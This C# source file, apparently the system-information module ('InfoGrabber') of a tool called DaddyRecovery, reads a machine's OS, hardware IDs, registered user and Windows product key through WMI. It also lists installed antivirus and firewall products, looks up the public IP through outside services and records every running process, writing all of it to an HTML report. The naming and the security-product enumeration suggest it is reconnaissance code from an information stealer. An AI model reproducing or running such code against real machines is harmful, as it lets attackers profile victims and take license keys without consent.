namespace DaddyRecovery.PCinfo
{
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.Linq;
    using System.Management;
    using System.Net;
    using System.Net.Sockets;
    using System.Text;
    using System.Text.RegularExpressions;
    using Helpers;

    public static class InfoGrabber
    {
        private static string GetMemoryType(int MemoryType)
        {
            switch (MemoryType)
            {
                case 0: { return "DDR-4"; }
                case 1: { return "Other"; }
                case 2: { return "DRAM"; }
                case 3: { return "Synchronous DRAM"; }
                case 4: { return "Cache DRAM"; }
                case 5: { return "EDO"; }
                case 6: { return "EDRAM"; }
                case 7: { return "VRAM"; }
                case 8: { return "SRAM"; }
                case 9: { return "RAM"; }
                case 10: { return "ROM"; }
                case 11: { return "Flash"; }
                case 12: { return "EEPROM"; }
                case 13: { return "FEPROM"; }
                case 14: { return "EPROM"; }
                case 15: { return "CDRAM"; }
                case 16: { return "3DRAM"; }
                case 17: { return "SDRAM"; }
                case 18: { return "SGRAM"; }
                case 19: { return "RDRAM"; }
                case 20: { return "DDR"; }
                case 21: { return "DDR-2"; }
                default: return MemoryType != 1 && MemoryType <= 22 ? MemoryType != 25 ? MemoryType > 25 ? "Unknown" : "No bar set" : "FBD2" : "DDR-3";
            }
        }

        private static readonly string[] MassLink =
        {
            "https://api.ipify.org/", "http://icanhazip.com/",
            "https://ipinfo.io/ip",   "http://checkip.amazonaws.com/"
        };

        public static void Inizialize()
        {
            var Log = new List<string>();

            #region Main Table

            Log.Clear();
            Log.Add("<!DOCTYPE html>");
            Log.Add("<html>");
            Log.Add("<head>");
            Log.Add("<title>SystemInfo</title>");
            Log.Add("<link rel=\"icon\" type=\"image/png\" href=\"http://s1.iconbird.com/ico/0612/customicondesignoffice2/w48h481339870371Personalinformation48.png\" sizes=\"32x32\">");
            Log.Add("</head>");
            Log.Add("<body style=\"width:100%; height:100%; margin: 0; background: url(http://radiographer.co.il/wp-content/uploads/2015/11/backgroundMain.jpg) #191919\">");
            Log.Add("<center><h1 style=\"color:#85AB70; margin:50px 0\">Computer Information System</h1></center>");

            try
            {
                using (ManagementObjectCollection searcher = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_OperatingSystem").Get())
                {
                    foreach (var os in searcher)
                    {
                        string productName = os["Caption"]?.ToString(), version = os["Version"]?.ToString();
                        Log.Add($"<center><span style=\"color:#6294B3\">Operating system: </span><span style=\"color:#BA9201\">{productName} - [ Version: {version} ] : {GlobalPath.OSBit}</span></center>");
                    }
                }
            }
            catch { }

            Log.Add($"<center><span style=\"color:#6294B3\">Computer name: </span><span style=\"color:#BA9201\">{GlobalPath.MachineName}</span></center>");
            Log.Add($"<center><span style=\"color:#6294B3\">Logical processes: </span><span style=\"color:#BA9201\">{GlobalPath.ProcessorCount}</span></center>");
            Log.Add($"<center><span style=\"color:#6294B3\">System directory: </span><span style=\"color:#BA9201\">{GlobalPath.SystemDir}</span></center>");

            #endregion

            try
            {
                using (ManagementObjectCollection Secret = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_Processor").Get())
                {
                    foreach (ManagementBaseObject cr in Secret)
                    {
                        string ProcessorName = cr["Name"]?.ToString(), ProcID = cr["ProcessorId"]?.ToString();

                        Log.Add($"<center><span style=\"color:#6294B3\">Central Processing Unit (CPU): </span><span style=\"color:#BA9201\">{ProcessorName} [ <a title=\"Manufacturer: {ProcessorName}\"</span>{ProcessorName} ]</a title></center>");
                        Log.Add($"<center><span style=\"color:#6294B3\">Processor ID: </span><span style=\"color:#BA9201\">{ProcID}</center>");
                        break;
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection MonitorEx = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_DesktopMonitor").Get())
                {
                    foreach (ManagementBaseObject queryObj in MonitorEx)
                    {
                        string ScreenWidth = queryObj["ScreenWidth"]?.ToString(), ScreenHeight = queryObj["ScreenHeight"]?.ToString();
                        Log.Add($"<center><span style=\"color:#6294B3\">Screen resolution: </span><span style=\"color:#BA9201\">{ScreenWidth} x {ScreenHeight} Pixels</span></center>");
                        break;
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection OS = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_OperatingSystem").Get())
                {
                    foreach (ManagementBaseObject z in OS)
                    {
                        Log.Add($"<center><span style=\"color:#6294B3\">Registered user: </span><span style=\"color:#BA9201\">{z["RegisteredUser"]?.ToString()}</span></center>");
                        Log.Add($"<center><span style=\"color:#6294B3\">Windows Serial Key: </span><span style=\"color:#BA9201\">{WinKey.GetWindowsProductKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "DigitalProductId")}</span></center>");
                        Log.Add($"<center><span style=\"color:#6294B3\">Windows Product Code: </span><span style=\"color:#BA9201\">{z["SerialNumber"]?.ToString()}</span></center>");
                        break;
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection Bios = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_BIOS").Get())
                {
                    foreach (ManagementBaseObject obj in Bios)
                    {
                        string BiosVersion = ((string[])obj["BIOSVersion"])[0], BiosVersionTwo = ((string[])obj["BIOSVersion"])[1];
                        var Manufacturer = obj["Manufacturer"]?.ToString();

                        if (((string[])obj["BIOSVersion"]).Length > 1)
                        {
                            Log.Add($"<center><span style=\"color:#6294B3\">BIOS version: <span style=\"color:#BA9201\">{BiosVersion} - {BiosVersionTwo} [ <a title=\"Manufacturer: {Manufacturer}\">{Manufacturer}</a title> ]</span><span style=\"color:#BA9201\"></span></center>");
                        }
                        else
                        {
                            Log.Add($"<center><span style=\"color:#6294B3\">BIOS version: <span style=\"color:#BA9201\">{BiosVersion} [ <a title=\"Manufacturer: {0x2}\">{0x2}</a title> ]</span></center>");
                        }
                        break;
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection wmiData = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct").Get())
                {
                    foreach (ManagementBaseObject item in wmiData)
                    {
                        Log.Add($"<center><span style=\"color:#6294B3\">Installed antivirus: </span><span style=\"color:#BA9201\">{item["displayName"]?.ToString()}</span></center>");
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection FireWall = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM FirewallProduct").Get())
                {
                    foreach (ManagementBaseObject item in FireWall)
                    {
                        Log.Add($"<center><span style=\"color:#6294B3\">Installed FireWall: </span><span style=\"color:#BA9201\">{item["displayName"]?.ToString()}</span></center>");
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection TotalMemory = new ManagementObjectSearcher(@"root\CIMV2", "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem").Get())
                {
                    foreach (ManagementBaseObject Total in TotalMemory)
                    {
                        try
                        {
                            string ConverterMB = Convert.ToString(Math.Round(Convert.ToDouble(Total["TotalPhysicalMemory"]) / 0x4000_0000 * 0x3E8, 0x2));
                            string ConverterGB = Convert.ToString(Math.Round(Convert.ToDouble(Total["TotalPhysicalMemory"]) / 0x4000_0000, 0x2));
                            bool Checker = Convert.ToDouble(Total["TotalPhysicalMemory"]?.ToString()) / 0x4000_0000 > 0x1;

                            if (Checker)
                            {
                                Log.Add($"<center><span style=\"color:#6294B3\">Physical memory: </span><span style=\"color:#BA9201\">({ConverterMB} MB)</span></center>");
                            }
                            else
                            {
                                Log.Add($"<center><span style=\"color:#6294B3\">Physical memory: </span><span style=\"color:#BA9201\">({ConverterGB} GB)</span></center>");
                            }
                            break;
                        }
                        catch (Exception) { break; }
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection Type = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_PhysicalMemory").Get())
                {
                    foreach (ManagementBaseObject ObjType in Type)
                    {
                        try
                        {
                            string MemoryType = GetMemoryType(int.Parse(ObjType["MemoryType"]?.ToString()));
                            string ConverterMB = Convert.ToString(Math.Round(Convert.ToDouble(ObjType["Capacity"]) / 0x4000_0000 * 0x3E8, 0x2));
                            string ConverterGB = Convert.ToString(Math.Round(Convert.ToDouble(ObjType["Capacity"]) / 0x4000_0000, 0x2));
                            bool Checker = Convert.ToDouble(ObjType["Capacity"]) / 0x4000_0000 <= 0x1;
                            if (Checker)
                            {
                                Log.Add($"<center><span style=\"color:#6294B3\">Memory type: </span><span style=\"color:#BA9201\">{MemoryType} - ( <a title=\"Memory: {ConverterMB} MB (Manufacturer: {ObjType["Manufacturer"]?.ToString()})\"</span>{ConverterMB} MB )</a title></span></center>");
                            }
                            else
                            {
                                Log.Add($"<center><span style=\"color:#6294B3\">Memory type: </span><span style=\"color:#BA9201\">{MemoryType} - ( <a title=\"Memory: {ConverterGB} GB (Manufacturer: {ObjType["Manufacturer"]?.ToString()})\"</span>{ConverterGB} GB )</a title></span></center>");
                            }
                        }
                        catch (Exception) { break; }
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection VC = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_VideoController").Get())
                {
                    foreach (ManagementBaseObject w in VC)
                    {
                        string container = string.Empty;
                        try
                        {
                            switch (Convert.ToDouble(w["AdapterRam"]) / 0x10_0000 % 0x400)
                            {
                                case 0: container = string.Concat(Convert.ToDouble(w.Properties["AdapterRam"]?.Value) / 0x10_0000 / 0x400, " GB"); break;
                                default: container = string.Concat((Convert.ToDouble(w.Properties["AdapterRam"]?.Value) / 0x10_0000).ToString("F2"), " MB"); break;
                            }
                        }
                        catch (Exception) { break; }

                        Log.Add($"<center><span style=\"color:#6294B3\">Video card: </span><span style=\"color:#BA9201\">{w["Caption"]?.ToString()}  -  <a title=\"Graphics card memory: {container}\"</span>({container})</a title></tr></span></center>");
                    }
                }
            }
            catch { }
            try
            {
                using (ManagementObjectCollection SysPC = new ManagementObjectSearcher(@"root\CIMV2", "SELECT * FROM Win32_ComputerSystem").Get())
                {
                    foreach (ManagementBaseObject gob in SysPC)
                    {
                        try
                        {
                            Log.Add(Regex.Replace($"<center><span style=\"color:#6294B3\">Computer model: </span><span style=\"color:#BA9201\">{gob["Manufacturer"]?.ToString()}{gob["Model"]?.ToString()}</span></center>", @"\s{2,}", " "));
                            Log.Add($"<center><span style=\"color:#6294B3\">Computer model manufacturer: </span><span style=\"color:#BA9201\">{gob["Manufacturer"]?.ToString()}</span></center>");
                        }
                        catch { break; }
                    }
                }
            }
            catch { }
            try
            {
                foreach (var ip in Dns.GetHostEntry(Dns.GetHostName()).AddressList.Where(ip => ip.AddressFamily.Equals(AddressFamily.InterNetwork)).Select(ip => ip))
                {
                    Log.Add($"<center><span style=\"color:#6294B3\">Local IP: </span><span style=\"color:#BA9201\">{ip?.ToString()}</span></center>");
                }
            }
            catch (Exception) { }
            foreach (var v in MassLink)
            {
                if (InetControl.CheckURL(v))
                {
                    Log.Add($"<center><span style=\"color:#6294B3\">External IP: </span><span style=\"color:#BA9201\">{InetControl.GetPublicIP(v)}</span></center>");
                    break;
                }
            }

            Log.Add($"<center><span style=\"color:#6294B3\"><details><summary>Show</span><span style=\"color:#BA9201\">Hide Running User Processes</summary><pre>{GetProcessPC(new StringBuilder())}</span></center>");
            Log.Add("</table>");
            Log.Add("</html>");
            CombineEx.CreateLineFile(GlobalPath.OSave, Log);
        }

        private static string GetProcessPC(StringBuilder Proclist)
        {
            try
            {
                var spisok = Process.GetProcesses();
                Proclist.AppendLine($"<center><span style=\"color:#6294B3\">Number of running processes:</span><span style=\"color:#BA9201\">[{spisok.Length}]</span></center>");
                Array.Sort(spisok, (p1, p2) => p1.ProcessName.CompareTo(p2.ProcessName));
                foreach (var item in Process.GetProcesses().Where(item => Process.GetCurrentProcess().Id != item.Id && item.Id != 0).Select(item => item))
                {
                    Proclist.AppendLine($"<span style=\"color:#6294B3\"><a title=\"Process name: {item.ProcessName}.exe\"</a title>{item.ProcessName}.exe</span><a title=\"Process ID: {item.Id}\"</a title><span style=\"color:#BA9201\">[{item.Id}]</span>");
                }
            }
            catch (Exception) { }

            return Proclist?.ToString();
        }
    }
}